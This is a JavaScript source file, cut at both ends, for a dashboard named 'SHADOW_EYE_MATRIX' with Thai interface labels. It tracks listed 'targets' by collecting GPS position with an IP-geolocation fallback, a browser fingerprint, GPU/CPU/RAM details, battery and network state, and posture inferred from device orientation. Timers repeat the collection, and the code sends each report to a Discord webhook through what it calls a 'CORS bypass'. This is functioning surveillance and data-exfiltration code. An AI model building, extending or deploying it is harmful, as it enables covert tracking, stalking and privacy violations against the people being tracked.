  input.value = p.name;
  input.maxLength = 32;
  el.replaceWith(input);
  input.focus();
  input.select();
  
  const commit = () => {
    const val = input.value.trim() || p.name;
    p.name = val;
    savePlayers();
    renderPlayerList();
    renderDrawerPlayerList();
    appendLog(`[MATRIX] Renamed target → "${val}"`, LOG.orange);
    printCommandGuide();
  };
  
  input.addEventListener('blur', commit);
  input.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') { e.preventDefault(); input.blur(); }
    if (e.key === 'Escape') { input.value = p.name; input.blur(); }
  });
}

function selectTarget(id) {
  selectedTarget = id;
  const p = getPlayer(id);
  if (infoActiveTarget) infoActiveTarget.textContent = p ? p.name : id;
  renderPlayerList();
  if (p?.coords) {
    panMapTo(p.coords.latitude, p.coords.longitude, 14);
    updateMapCoordsDisplay(p.coords.latitude, p.coords.longitude, p.name);
  }
  appendLog(`[MATRIX] Selected target: ${p?.name || id}`, LOG.orange);
}

function toggleTracking(id) {
  const p = getPlayer(id);
  if (!p) return;
  
  p.tracking = !p.tracking;
  savePlayers();
  renderPlayerList();
  
  if (p.tracking) {
    appendLog(`[MATRIX] Tracking ON — ${p.name}`, LOG.green);
    startTrackingTimer(id);
    forceFetchPlayer(id);
  } else {
    appendLog(`[MATRIX] Tracking OFF — ${p.name}`, LOG.red);
    stopTrackingTimer(id);
    printCommandGuide();
  }
}

function startTrackingTimer(id) {
  stopTrackingTimer(id);
  trackingTimers[id] = setInterval(() => {
    const p = getPlayer(id);
    if (p?.tracking) forceFetchPlayer(id, true);
  }, TRACKING_INTERVAL_MS);
}

function stopTrackingTimer(id) {
  if (trackingTimers[id]) {
    clearInterval(trackingTimers[id]);
    delete trackingTimers[id];
  }
}

function stopAllTracking() {
  Object.keys(trackingTimers).forEach(stopTrackingTimer);
}

async function forceFetchPlayer(id, silent = false) {
  const p = getPlayer(id);
  if (!p) return;
  selectTarget(id);
  if (!silent) appendLog(`[MATRIX] Force Fetch — ${p.name}`, LOG.orange);
  await runHybridGeolocation(`Player: ${p.name}`, id);
}

function addPlayer() {
  const n = players.length + 1;
  const id = `player-${Date.now()}`;
  players.push({ 
    id, 
    name: `Player ${n}`, 
    tracking: false, 
    coords: null, 
    lastUpdate: null, 
    permission: null, 
    source: null, 
    distanceKm: null,
    ip: null,
    isp: null,
    battery: null,
    charging: null,
    network: null,
    os: null,
    screen: null,
    notes: '',
    identity: '',
    lastOnline: null,
    lastOffline: null,
    _expanded: false
  });
  savePlayers();
  renderPlayerList();
  appendLog(`[MATRIX] Added target: Player ${n}`, LOG.green);
  printCommandGuide();
}

function deletePlayer(id) {
  const p = getPlayer(id);
  if (!p) return;
  
  if (confirm(`ยืนยันการลบเป้าหมาย "${p.name}" ใช่หรือไม่?`)) {
    players = players.filter(player => player.id !== id);
    savePlayers();
    renderPlayerList();
    renderDrawerPlayerList();
    // Clear location history
    try { localStorage.removeItem(`location_history_${id}`); } catch (_) {}
    // Clear timeline
    try { localStorage.removeItem(TIMELINE_KEY + id); } catch (_) {}
    appendLog(`[MATRIX] Deleted target: ${p.name}`, LOG.red);
    printCommandGuide();
  }
}

// ===== SCREEN ANALYTICS (once) =====
function captureScreenAnalytics() {
  if (screenAnalytics) return screenAnalytics;
  try {
    const w = window.screen?.width || 0;
    const h = window.screen?.height || 0;
    const dpr = window.devicePixelRatio || 1;
    screenAnalytics = {
      width: w, height: h, devicePixelRatio: dpr,
      resolution: `${w}x${h}`,
      effectiveResolution: `${Math.round(w * dpr)}x${Math.round(h * dpr)}`,
      orientation: w > h ? 'Landscape' : 'Portrait',
    };
  } catch (_) {
    screenAnalytics = { width: 0, height: 0, devicePixelRatio: 1, resolution: '—', effectiveResolution: '—', orientation: '—' };
  }
  return screenAnalytics;
}

// ===== HAVERSINE =====
function haversine(lat1, lng1, lat2, lng2) {
  const R = 6371, rad = (d) => (d * Math.PI) / 180;
  const dLat = rad(lat2 - lat1), dLng = rad(lng2 - lng1);
  const a = Math.sin(dLat / 2) ** 2 + Math.cos(rad(lat1)) * Math.cos(rad(lat2)) * Math.sin(dLng / 2) ** 2;
  return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
}

function calcDist(lat, lng) {
  if (lat == null || lng == null) return null;
  return haversine(lat, lng, BASE_LAT, BASE_LNG);
}

// ===== FINGERPRINT (safe) =====
function detectOS() {
  try {
    const ua = navigator.userAgent || '';
    if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
    if (/Android/.test(ua)) return 'Android';
    if (/Mac OS X/.test(ua)) return 'Mac';
    if (/Windows/.test(ua)) return 'Windows';
    if (/Linux/.test(ua)) return 'Linux';
  } catch (_) {}
  return 'Unknown';
}

function detectBrowser() {
  try {
    const ua = navigator.userAgent || '';
    if (ua.includes('Firefox/')) return 'Firefox';
    if (ua.includes('Edg/')) return 'Edge';
    if (ua.includes('Chrome/')) return 'Chrome';
    if (ua.includes('Safari/')) return 'Safari';
  } catch (_) {}
  return 'Unknown';
}

// ===== HARDWARE TELEMETRY =====
function detectDeviceType() {
  try {
    const ua = navigator.userAgent || '';
    if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
    if (/Android/.test(ua)) return 'Android';
    if (/Mac OS X|Macintosh/.test(ua)) return 'Mac';
    if (/Windows/.test(ua)) return 'PC';
    if (/Linux/.test(ua)) return 'Linux';
    if (/CrOS/.test(ua)) return 'ChromeOS';
  } catch (_) {}
  return 'Unknown';
}

function getCPUCores() {
  try {
    return navigator.hardwareConcurrency || null;
  } catch (_) {
    return null;
  }
}

function getRAM() {
  try {
    // deviceMemory returns GB, but not all browsers support it
    return navigator.deviceMemory || null;
  } catch (_) {
    return null;
  }
}

function getGPU() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return null;
    
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    if (debugInfo) {
      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      return renderer || null;
    }
    
    // Fallback: try to get basic renderer info
    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
    if (dbg) {
      return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || null;
    }
  } catch (_) {}
  return null;
}

function calculatePosture(alpha, beta, gamma) {
  // alpha: 0-360 (rotation around z-axis, compass direction)
  // beta: -180 to 180 (front to back tilt, front-back)
  // gamma: -90 to 90 (left to right tilt, left-right)
  
  if (beta === null || beta === undefined) return 'unknown';
  
  const absBeta = Math.abs(beta);
  const absGamma = Math.abs(gamma || 0);
  
  // Lying down: device is flat (beta near 0 or 180, gamma near 0)
  if (absBeta < 30 || absBeta > 150) {
    if (absGamma < 30) return 'lying';
  }
  
  // Standing: device held upright (beta near 90)
  if (absBeta > 60 && absBeta < 120) {
    if (absGamma < 45) return 'standing';
  }
  
  // Sitting: device at moderate angle
  if (absBeta > 30 && absBeta < 60) {
    if (absGamma < 45) return 'sitting';
  }
  
  return 'unknown';
}

function getPostureThai(posture) {
  const thai = {
    'sitting': 'นั่ง',
    'standing': 'ยืน',
    'lying': 'นอน',
    'unknown': 'ไม่ทราบ'
  };
  return thai[posture] || 'ไม่ทราบ';
}

function initDeviceOrientation() {
  if (typeof DeviceOrientationEvent === 'undefined') {
    appendLog('[TELEMETRY] Device Orientation API not supported', LOG.orange);
    return;
  }
  
  // Check for permission (iOS 13+)
  if (typeof DeviceOrientationEvent.requestPermission === 'function') {
    appendLog('[TELEMETRY] Requesting orientation permission...', LOG.orange);
    DeviceOrientationEvent.requestPermission()
      .then(permissionState => {
        if (permissionState === 'granted') {
          startOrientationListener();
        } else {
          appendLog('[TELEMETRY] Orientation permission denied', LOG.red);
        }
      })
      .catch(err => {
        appendLog(`[TELEMETRY] Orientation error: ${err.message}`, LOG.red);
      });
  } else {
    startOrientationListener();
  }
}

function startOrientationListener() {
  window.addEventListener('deviceorientation', (event) => {
    const alpha = event.alpha;
    const beta = event.beta;
    const gamma = event.gamma;
    
    hardwareTelemetry.orientation = { alpha, beta, gamma };
    hardwareTelemetry.posture = calculatePosture(alpha, beta, gamma);
    
    // Update display periodically
    if (!orientationTimer) {
      orientationTimer = setTimeout(() => {
        updateHardwareTelemetryDisplay();
        orientationTimer = null;
      }, 500);
    }
  });
  
  appendLog('[TELEMETRY] Device Orientation monitoring started', LOG.green);
}

function getHardwareTelemetry() {
  return {
    deviceType: detectDeviceType(),
    cpuCores: getCPUCores(),
    ramGB: getRAM(),
    gpu: getGPU(),
    posture: hardwareTelemetry.posture,
    orientation: { ...hardwareTelemetry.orientation }
  };
}

function updateHardwareTelemetryDisplay() {
  const p = getPlayer(selectedTarget);
  if (!p) return;
  
  const card = document.querySelector(`.player-card[data-id="${selectedTarget}"]`);
  if (!card) return;
  
  const metadataEl = card.querySelector('.player-metadata');
  if (!metadataEl) return;
  
  // Get current hardware telemetry
  const hw = getHardwareTelemetry();
  
  // Update the hardware section in metadata
  const hwSection = metadataEl.querySelector('.hardware-telemetry');
  if (hwSection) {
    hwSection.innerHTML = `
      <div class="text-[10px] text-white">
        <span class="text-cyan-400">🖥️ ประเภทอุปกรณ์:</span> ${hw.deviceType || '—'}
      </div>
      <div class="text-[10px] text-white">
        <span class="text-cyan-400">⚙️ CPU Cores:</span> ${hw.cpuCores ? hw.cpuCores + ' cores' : '—'}
      </div>
      <div class="text-[10px] text-white">
        <span class="text-cyan-400">💾 RAM:</span> ${hw.ramGB ? hw.ramGB + ' GB' : '—'}
      </div>
      <div class="text-[10px] text-white">
        <span class="text-cyan-400">🎮 GPU:</span> ${hw.gpu ? hw.gpu.substring(0, 30) + (hw.gpu.length > 30 ? '...' : '') : '—'}
      </div>
      <div class="text-[10px] text-white">
        <span class="text-cyan-400">🧍 ท่าทาง:</span> ${getPostureThai(hw.posture)}
      </div>
    `;
  }
}

function getFingerprint() {
  const sa = captureScreenAnalytics();
  let tz = 'Unknown';
  try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (_) {}
  return {
    os: detectOS(), browser: detectBrowser(),
    language: navigator.language || 'Unknown',
    languages: (navigator.languages || []).join(', ') || 'Unknown',
    timezone: tz,
    timezoneOffset: new Date().getTimezoneOffset(),
    screen: sa.resolution, screenWidth: sa.width, screenHeight: sa.height,
    devicePixelRatio: sa.devicePixelRatio, effectiveResolution: sa.effectiveResolution,
    orientation: sa.orientation,
    platform: navigator.platform || 'Unknown',
    online: typeof navigator.onLine === 'boolean' ? navigator.onLine : true,
  };
}

// ===== LOW-RESOURCE MONITORS =====
function initMonitors() {
  if (monitorsActive) return;
  monitorsActive = true;
  document.addEventListener('visibilitychange', onVisibilityChange);
  window.addEventListener('online', onNetOnline);
  window.addEventListener('offline', onNetOffline);
}

function teardownMonitors() {
  if (!monitorsActive) return;
  monitorsActive = false;
  document.removeEventListener('visibilitychange', onVisibilityChange);
  window.removeEventListener('online', onNetOnline);
  window.removeEventListener('offline', onNetOffline);
}

function onVisibilityChange() {
  if (!sessionUser) return;
  if (document.hidden) {
    appendLog('[WARNING]: User switched tab / Console blurred!', LOG.red);
    sendDiscordAlert('⚠️ Anti-Tamper', `[WARNING]: User switched tab / Console blurred!\n👤 Actor: Admin (${sessionUser})`, 0xef4444);
  } else {
    appendLog('[SYSTEM]: User returned to console.', LOG.green);
  }
}

function onNetOffline() {
  if (!sessionUser) return;
  appendLog('[ALERT]: Network Disconnected!', LOG.red);
  setHeaderStatus('Offline', 'red');
}

function onNetOnline() {
  if (!sessionUser) return;
  appendLog('[SYSTEM]: Network Restored!', LOG.green);
  setHeaderStatus('Ready', 'white');
}

// ===== LEAFLET MAP =====
function createIcon(cls) {
  if (typeof L === 'undefined') return null;
  return L.divIcon({ className: cls, iconSize: [16, 16], iconAnchor: [8, 8], popupAnchor: [0, -10] });
}

function initMap() {
  if (mapReady || typeof L === 'undefined' || !tacticalMapEl) return;
  
  try {
    mapInstance = L.map(tacticalMapEl, {
      center: [BASE_LAT, BASE_LNG],
      zoom: 10,
      zoomControl: true,
      attributionControl: true,
    });
    
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
      attribution: '&copy; OSM &copy; CARTO',
      subdomains: 'abcd',
      maxZoom: 19,
    }).addTo(mapInstance);
    
    mapMarkers.hq = L.marker([BASE_LAT, BASE_LNG], { icon: createIcon('marker-hq') })
      .addTo(mapInstance)
      .bindPopup('<b>HQ — Chumphon</b><br>ศูนย์บัญชาการ');
    
    mapReady = true;
    
    setTimeout(() => {
      try { mapInstance.invalidateSize(); } catch (_) {}
    }, 300);
  } catch (err) {
    appendLog(`[MAP] Init failed: ${err.message}`, LOG.red);
  }
}

function destroyMap() {
  if (mapInstance) {
    try { mapInstance.remove(); } catch (_) {}
    mapInstance = null;
    mapMarkers = { hq: null, admin: null, players: {} };
    mapReady = false;
  }
}

function panMapTo(lat, lng, zoom) {
  if (!mapInstance || lat == null || lng == null) return;
  try {
    mapInstance.flyTo([lat, lng], zoom || mapInstance.getZoom(), { duration: 0.8 });
    updateMapCoordsDisplay(lat, lng);
  } catch (_) {}
}

function updateMapCoordsDisplay(lat, lng, label) {
  if (!mapCoordsDisplay) return;
  const prefix = label ? `${label}: ` : '';
  mapCoordsDisplay.textContent = lat != null ? `${prefix}${lat.toFixed(5)}, ${lng.toFixed(5)}` : '—';
}

function updateMapMarker(type, id, lat, lng, popupHtml) {
  if (!mapInstance || typeof L === 'undefined' || lat == null || lng == null) return;
  
  try {
    if (type === 'admin') {
      if (mapMarkers.admin) mapMarkers.admin.setLatLng([lat, lng]);
      else mapMarkers.admin = L.marker([lat, lng], { icon: createIcon('marker-admin') }).addTo(mapInstance);
      mapMarkers.admin.bindPopup(popupHtml || '<b>Admin</b>');
    } else if (type === 'player') {
      const cls = selectedTarget === id ? 'marker-player active' : 'marker-player';
      if (mapMarkers.players[id]) {
        mapMarkers.players[id].setLatLng([lat, lng]);
        mapMarkers.players[id].setIcon(createIcon(cls));
      } else {
        mapMarkers.players[id] = L.marker([lat, lng], { icon: createIcon(cls) }).addTo(mapInstance);
      }
      // Add click event to open Google Maps
      mapMarkers.players[id].on('click', () => {
        const p = getPlayer(id);
        if (p?.coords) {
          window.open(`https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, '_blank');
        }
      });
      mapMarkers.players[id].bindPopup(popupHtml || `<b>${id}</b><br><a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank" class="text-orange-400">🗺️ เปิดใน Google Maps</a>`);
    }
  } catch (_) {}
}

// ===== GEOLOCATION =====
function requestGPS() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error('Geolocation not supported'));
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => resolve({
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
      }),
      (err) => reject(err),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
}

async function fetchIPGeo() {
  const res = await fetch('https://ipapi.co/json/');
  if (!res.ok) throw new Error(`IP API ${res.status}`);
  return res.json();
}

function mapsLink(lat, lng) {
  return lat != null ? `https://www.google.com/maps?q=${lat},${lng}` : null;
}

async function runHybridGeolocation(actorLabel = 'Admin', playerId = null) {
  if (isProcessing) {
    appendLog('ระบบกำลังประมวลผล...', LOG.orange);
    printCommandGuide();
    return;
  }
  
  isProcessing = true;
  setHeaderStatus('Processing...', 'orange');
  if (infoGps) { infoGps.textContent = 'Processing...'; infoGps.className = 'text-orange-400'; }
  if (infoLastAction) infoLastAction.textContent = actorLabel;
  
  appendLog(`[${actorLabel}] Hybrid Geolocation start...`, LOG.orange);
  appendLog('กำลังขอสิทธิ์ GPS...', LOG.white);
  
  const fp = getFingerprint();
  const result = {
    actor: actorLabel,
    permission: null, source: null, coords: null, ipData: null,
    fingerprint: fp, distanceKm: null,
    timestamp: new Date().toISOString(),
    mapsLink: null,
  };
  
  try {
    const gps = await requestGPS();
    result.permission = 'Granted';
    result.source = 'GPS';
    result.coords = gps;
    result.mapsLink = mapsLink(gps.latitude, gps.longitude);
    
    appendLog(`[${actorLabel}] GPS Granted`, LOG.green);
    appendLog(`พิกัด: ${gps.latitude.toFixed(6)}, ${gps.longitude.toFixed(6)}`, LOG.white);
    appendLog(`ความแม่นยำ: ±${Math.round(gps.accuracy)}m`, LOG.orange);
    if (infoGps) { infoGps.textContent = 'Granted'; infoGps.className = 'text-green-400'; }
  } catch (err) {
    result.permission = 'Denied';
    result.source = 'IP Geolocation';
    appendLog(`[${actorLabel}] GPS Denied — IP Fallback`, LOG.red);
    appendLog(`Reason: ${err.message || 'denied'}`, LOG.red);
    
    try {
      const ip = await fetchIPGeo();
      result.ipData = ip;
      result.coords = { latitude: ip.latitude, longitude: ip.longitude };
      result.mapsLink = mapsLink(ip.latitude, ip.longitude);
      appendLog(`IP: ${ip.ip || '—'} | ${ip.city || '—'}, ${ip.region || '—'}`, LOG.white);
      appendLog(`ISP: ${ip.org || '—'}`, LOG.orange);
    } catch (ipErr) {
      appendLog(`IP Geo failed: ${ipErr.message}`, LOG.red);
    }
    
    appendLog(`OS: ${fp.os} | Browser: ${fp.browser} | TZ: ${fp.timezone}`, LOG.orange);
    if (infoGps) { infoGps.textContent = 'Denied (IP)'; infoGps.className = 'text-red-400'; }
  }
  
  if (result.coords?.latitude != null) {
    result.distanceKm = calcDist(result.coords.latitude, result.coords.longitude);
    appendLog(`[DISTANCE]: Target is ${result.distanceKm.toFixed(2)} km away from Center.`, LOG.white);
    
    panMapTo(result.coords.latitude, result.coords.longitude, 14);
    
    if (playerId) {
      const p = getPlayer(playerId);
      if (p) {
        p.coords = { latitude: result.coords.latitude, longitude: result.coords.longitude };
        p.lastUpdate = result.timestamp;
        p.permission = result.permission;
        p.source = result.source;
        p.distanceKm = result.distanceKm;
        
        p.ip = result.ipData?.ip || null;
        p.isp = result.ipData?.org || null;
        p.os = fp.os;
        p.screen = fp.screen;
        
        // Update lastOnline and add timeline event
        p.lastOnline = result.timestamp;
        p.lastOffline = null;
        addTimelineEvent(playerId, 'online', { coords: p.coords });
        
        if (typeof navigator.getBattery === 'function') {
          try {
            const battery = await navigator.getBattery();
            p.battery = Math.round((battery.level || 0) * 100);
            p.charging = battery.charging;
          } catch (_) {}
        }
        
        try {
          const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
          if (conn) {
            p.network = conn.effectiveType || conn.type || 'Unknown';
          }
        } catch (_) {}
        
        savePlayers();
        renderPlayerList();
        updateMapMarker('player', playerId, result.coords.latitude, result.coords.longitude,
            `<b>${esc(p.name)}</b><br>${result.coords.latitude.toFixed(5)}, ${result.coords.longitude.toFixed(5)}<br>${result.distanceKm.toFixed(2)} km from HQ<br><a href="https://www.google.com/maps?q=${result.coords.latitude},${result.coords.longitude}" target="_blank" class="text-orange-400">🗺️ เปิดใน Google Maps</a>`);
        updateMapCoordsDisplay(result.coords.latitude, result.coords.longitude, p.name);
      }
    } else {
      updateMapMarker('admin', null, result.coords.latitude, result.coords.longitude,
        `<b>Admin</b><br>${result.coords.latitude.toFixed(5)}, ${result.coords.longitude.toFixed(5)}<br>${result.distanceKm.toFixed(2)} km from HQ`);
      updateMapCoordsDisplay(result.coords.latitude, result.coords.longitude, 'Admin');
      lastGpsResult = result;
    }
  }
  
  appendLog('Sending to Discord...', LOG.orange);
  await sendToDiscord(result);
  appendLog('Complete.', LOG.green);
  
  setHeaderStatus('Ready', 'white');
  isProcessing = false;
  printCommandGuide();
}

// ===== DISCORD (multi-strategy CORS bypass) =====
function postDiscord(payload) {
  if (!DISCORD_WEBHOOK_URL) return Promise.resolve(false);
  const body = JSON.stringify(payload);
  
  try {
    if (typeof navigator.sendBeacon === 'function') {
      const blob = new Blob([body], { type: 'application/json' });
      if (navigator.sendBeacon(DISCORD_WEBHOOK_URL, blob)) return Promise.resolve(true);
    }
  } catch (_) {}
  
  return fetch(DISCORD_WEBHOOK_URL, {
    method: 'POST',
    mode: 'no-cors',
    headers: { 'Content-Type': 'text/plain' },
    body,
  }).then(() => true).catch(() => false);
}

async function sendDiscordAlert(title, desc, color) {
  const ok = await postDiscord({
    embeds: [{ title, description: desc, color, footer: { text: 'SHADOW_EYE_MATRIX — Alert' }, timestamp: new Date().toISOString() }],
  });
  if (!ok) appendLog('Discord alert dispatch failed', LOG.red);
}

async function sendToDiscord(data) {
  if (!DISCORD_WEBHOOK_URL) {
    appendLog('Discord URL not configured', LOG.red);
    return;
  }
  
  const granted = data.permission === 'Granted';
  const fp = data.fingerprint || {};
  const hw = getHardwareTelemetry();
  const fields = [
    { name: '🎭 Actor [ผู้ทำการ]', value: data.actor || 'Admin', inline: false },
    { name: '🔐 Permission [สิทธิ์การเข้าถึง]', value: granted ? '✅ Granted (GPS) [ได้รับอนุญาต GPS]' : '❌ Denied (IP Geo) [ปฏิเสธ - ใช้ IP]', inline: true },
    { name: '📡 Source [แหล่งข้อมูล]', value: data.source || '—', inline: true },
  ];
  
  if (data.coords) {
    fields.push({ name: '📍 Coordinates [พิกัดดาวเทียม]', value: `${data.coords.latitude}, ${data.coords.longitude}`, inline: false });
    if (data.coords.accuracy != null) fields.push({ name: '🎯 Accuracy [ความแม่นยำ]', value: `±${Math.round(data.coords.accuracy)}m`, inline: true });
  }
  if (data.distanceKm != null) {
    fields.push({ name: '📏 Distance from HQ [ระยะห่างจากศูนย์บัญชาการ]', value: `${data.distanceKm.toFixed(2)} km (Chumphon ${BASE_LAT}, ${BASE_LNG})`, inline: false });
  }
  if (data.ipData) {
    fields.push(
      { name: '🌍 Country [ประเทศ]', value: `${data.ipData.country_name || '—'}`, inline: true },
      { name: '🏙 City [เมือง]', value: `${data.ipData.region || '—'}, ${data.ipData.city || '—'}`, inline: true },
      { name: '🌐 ISP [ผู้ให้บริการ]', value: data.ipData.org || '—', inline: false },
      { name: '🔢 IP [ที่อยู่ IP]', value: data.ipData.ip || '—', inline: true },
    );
  }
  
  // Hardware Telemetry fields
  fields.push(
    { name: '🖥️ Device Type [ประเภทอุปกรณ์]', value: hw.deviceType || '—', inline: true },
    { name: '⚙️ CPU Cores [ซีพียู]', value: hw.cpuCores ? hw.cpuCores + ' cores' : '—', inline: true },
    { name: '💾 RAM [หน่วยความจำ]', value: hw.ramGB ? hw.ramGB + ' GB' : '—', inline: true },
    { name: '🎮 GPU [การ์ดจอ]', value: hw.gpu ? hw.gpu.substring(0, 30) + (hw.gpu.length > 30 ? '...' : '') : '—', inline: false },
    { name: '🧍 Posture [ท่าทาง]', value: getPostureThai(hw.posture), inline: true },
  );
  
  // Standard fingerprint fields
  fields.push(
    { name: '💻 OS [ระบบปฏิบัติการ]', value: fp.os || '—', inline: true },
    { name: '🌐 Browser [เว็บเบราว์เซอร์]', value: fp.browser || '—', inline: true },
    { name: '🗣 Language [ภาษา]', value: fp.language || '—', inline: true },
    { name: '🕰 Timezone [โซนเวลา]', value: fp.timezone || '—', inline: true },
    { name: '📱 Screen [หน้าจอ]', value: fp.screen || '—', inline: true },
    { name: '🔍 DPR [อัตราส่วนหน้าจอ]', value: String(fp.devicePixelRatio ?? '—'), inline: true },
    { name: '🖥 Effective Res [ความละเอียดที่แสดง]', value: fp.effectiveResolution || '—', inline: true },
    { name: '👤 Session [เซสชัน]', value: sessionUser || '—', inline: true },
  );
  
  if (data.mapsLink) fields.push({ name: '🗺 Google Maps [เปิดแผนที่]', value: `[Open Map](${data.mapsLink})`, inline: false });
  
  const ok = await postDiscord({
    embeds: [{
      title: '🛰 SHADOW_EYE_MATRIX — Location Report [รายงานพิกัด]',
      description: granted ? `${data.actor}: GPS Granted [ได้รับพิกัด GPS]` : `${data.actor}: GPS Denied — IP + Fingerprint [ปฏิเสธ GPS - ใช้ IP + ลายนิ้วมือ`,
      color: granted ? 0x22c55e : 0xef4444,
      fields,
      footer: { text: 'SHADOW_EYE_MATRIX Tactical Dashboard [แดชบอร์ดสงคราม]' },
      timestamp: data.timestamp,
    }],
  });
  
  appendLog(ok ? 'Discord payload dispatched ✓' : 'Discord dispatch failed ✗', ok ? LOG.green : LOG.red);
}

// ===== SAFE API HELPERS (mobile crash prevention) =====
async function safeBatteryCheck() {
  if (typeof navigator.getBattery !== 'function') {
    appendLog('Battery API not supported on this device', LOG.red);
    return;
  }
  appendLog('Checking battery...', LOG.orange);
  try {
    const b = await navigator.getBattery();
    if (!b) { appendLog('Battery data unavailable', LOG.red); return; }
    const pct = Math.round((b.level || 0) * 100);
    appendLog(`Battery: ${pct}%`, pct > 20 ? LOG.white : LOG.red);
    appendLog(`Charging: ${b.charging ? 'Yes' : 'No'}`, b.charging ? LOG.green : LOG.orange);
    if (b.charging && b.chargingTime !== Infinity) appendLog(`Time to full: ~${Math.round(b.chargingTime / 60)} min`, LOG.orange);
    if (!b.charging && b.dischargingTime !== Infinity) appendLog(`Time remaining: ~${Math.round(b.dischargingTime / 60)} min`, LOG.orange);
  } catch (err) {
    appendLog(`Battery check error: ${err.message || 'unknown'}`, LOG.red);
  }
}

function safeNetworkCheck() {
  appendLog('═══ Network Status ═══', LOG.green);
  const online = typeof navigator.onLine === 'boolean' ? navigator.onLine : true;
  appendLog(`Connection: ${online ? 'Online' : 'Offline'}`, online ? LOG.green : LOG.red);
  
  try {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
      appendLog(`Type: ${conn.effectiveType || conn.type || '—'}`, LOG.white);
      if (conn.downlink != null) appendLog(`Downlink: ${conn.downlink} Mbps`, LOG.orange);
      if (conn.rtt != null) appendLog(`RTT: ${conn.rtt} ms`, LOG.orange);
      if (conn.saveData != null) appendLog(`Save-Data: ${conn.saveData ? 'On' : 'Off'}`, LOG.white);
    } else {
      appendLog('Network Info API unavailable — using online/offline only', LOG.orange);
    }
  } catch (err) {
    appendLog(`Network check error: ${err.message || 'unknown'}`, LOG.red);
  }
}

// ===== COMMANDS =====
const COMMANDS = {
  '/help': () => {
    appendLog('Available commands:', LOG.green);
    appendLog('  /gps       — Admin GPS scan (Hybrid + distance)', LOG.white);
    appendLog('  /status    — Device status, fingerprint, screen', LOG.white);
    appendLog('  /telemetry — Advanced Hardware Telemetry (Device Type, CPU, RAM, GPU, Posture)', LOG.white);
    appendLog('  /battery   — Battery level (if supported)', LOG.white);
    appendLog('  /network   — Network connection status', LOG.white);
    appendLog('  /clear     — Clear console', LOG.white);
    appendLog('  /logout    — Logout & clear session', LOG.white);
    appendLog('  /help      — Show all commands', LOG.white);
  },
  '/gps': async () => { await runHybridGeolocation('Admin'); return 'skip'; },
  '/status': () => {
    const fp = getFingerprint();
    const sa = captureScreenAnalytics();
    appendLog('═══ System Status ═══', LOG.green);
    appendLog(`Session: ${sessionUser || '—'} | Actor: ${selectedTarget === 'admin' ? 'Admin' : getPlayer(selectedTarget)?.name || selectedTarget}`, LOG.white);
    appendLog(`Network: ${fp.online ? 'Online' : 'Offline'}`, fp.online ? LOG.green : LOG.red);
    appendLog('── Screen Analytics ──', LOG.orange);
    appendLog(`Resolution: ${sa.resolution} | DPR: ${sa.devicePixelRatio}`, LOG.white);
    appendLog(`Effective: ${sa.effectiveResolution} | ${sa.orientation}`, LOG.orange);
    appendLog('── Fingerprint ──', LOG.orange);
    appendLog(`OS: ${fp.os} | Browser: ${fp.browser}`, LOG.white);
    appendLog(`Lang: ${fp.language} | TZ: ${fp.timezone}`, LOG.white);
    if (lastGpsResult) {
      appendLog('── Last Admin GPS ──', LOG.orange);
      appendLog(`Status: ${lastGpsResult.permission} (${lastGpsResult.source})`, lastGpsResult.permission === 'Granted' ? LOG.green : LOG.red);
      if (lastGpsResult.distanceKm != null) appendLog(`[DISTANCE]: ${lastGpsResult.distanceKm.toFixed(2)} km from Center`, LOG.white);
    }
    players.forEach((p) => {
      if (p.coords) appendLog(`[${p.name}]: ${p.coords.latitude.toFixed(4)}, ${p.coords.longitude.toFixed(4)} (${p.distanceKm?.toFixed(2) || '?'} km)`, LOG.orange);
    });
  },
  '/telemetry': () => {
    const hw = getHardwareTelemetry();
    appendLog('═══ Advanced Hardware Telemetry ═══', LOG.green);
    appendLog(`🖥️ ประเภทอุปกรณ์: ${hw.deviceType || '—'}`, LOG.cyan || LOG.white);
    appendLog(`⚙️ CPU Cores: ${hw.cpuCores ? hw.cpuCores + ' cores' : '—'}`, LOG.white);
    appendLog(`💾 RAM: ${hw.ramGB ? hw.ramGB + ' GB' : '—'}`, LOG.white);
    appendLog(`🎮 GPU: ${hw.gpu ? hw.gpu : '—'}`, LOG.white);
    appendLog(`🧍 ท่าทาง: ${getPostureThai(hw.posture)}`, LOG.orange);
    if (hw.orientation.alpha !== null) {
      appendLog(`📊 Orientation: α=${hw.orientation.alpha?.toFixed(1) || '—'}°, β=${hw.orientation.beta?.toFixed(1) || '—'}°, γ=${hw.orientation.gamma?.toFixed(1) || '—'}°`, LOG.dim);
    }
    appendLog('[TELEMETRY] Device Orientation monitoring active', LOG.green);
  },
  '/battery': async () => { await safeBatteryCheck(); },
  '/network': () => { safeNetworkCheck(); },
  '/clear': () => { clearConsole(); appendLog('Console cleared.', LOG.green); },
  '/logout': () => { showLogin(); return 'skip'; },
};

async function handleCommand(raw) {
  const cmd = raw.trim().toLowerCase();
  if (!cmd) return;
  appendLog(`> ${raw.trim()}`, LOG.green);
  
  const fn = COMMANDS[cmd];
  if (!fn) {
    appendLog(`Unknown: "${cmd}" — type /help`, LOG.red);
    printCommandGuide();
    return;
  }
  
  if (infoLastAction) infoLastAction.textContent = cmd;
  const r = await fn();
  if (r !== 'skip') printCommandGuide();
}

// ===== UI =====
function setHeaderStatus(text, color) {
  if (!headerStatus) return;
  headerStatus.textContent = text;
